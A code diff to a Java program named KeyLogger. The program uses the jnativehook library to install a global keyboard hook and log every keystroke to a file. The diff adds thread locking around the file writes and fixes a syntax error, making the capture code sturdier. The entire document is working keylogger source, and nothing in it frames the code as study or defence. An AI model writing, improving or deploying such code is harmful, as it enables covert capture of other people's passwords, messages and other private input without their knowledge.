@@ -1,13 +1,18 @@
 import java.io.FileWriter;
+import java.util.concurrent.locks.ReentrantLock;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 public class KeyLogger implements NativeKeyListener, Runnable {
 	static FileWriter fw ;
+	ReentrantLock re;
+	KeyLogger(ReentrantLock re){
+		this.re = re;
+	} 
     public void run(){
 		initializeFileObjects();
-		try {1
+		try {
 			GlobalScreen.registerNativeHook();
 		}
 		catch (NativeHookException ex) {
@@ -15,7 +20,7 @@ public class KeyLogger implements NativeKeyListener, Runnable {
 			System.err.println(ex.getMessage());
 			System.exit(1);
 		}
-		GlobalScreen.addNativeKeyListener(new KeyLogger());
+		GlobalScreen.addNativeKeyListener(new KeyLogger(re));
 	}
     public static void initializeFileObjects(){
         try{
@@ -26,9 +31,11 @@ public class KeyLogger implements NativeKeyListener, Runnable {
     }
 	public void nativeKeyPressed(NativeKeyEvent e) {
          try{
-            String str = e.getKeyText(e.getKeyCode());
+			String str = e.getKeyText(e.getKeyCode());
+			re.lock();
             fw.write(str);
-            fw.flush();
+			fw.flush();
+			re.unlock();
         }catch(Exception ex){
             System.out.println(ex);
         }
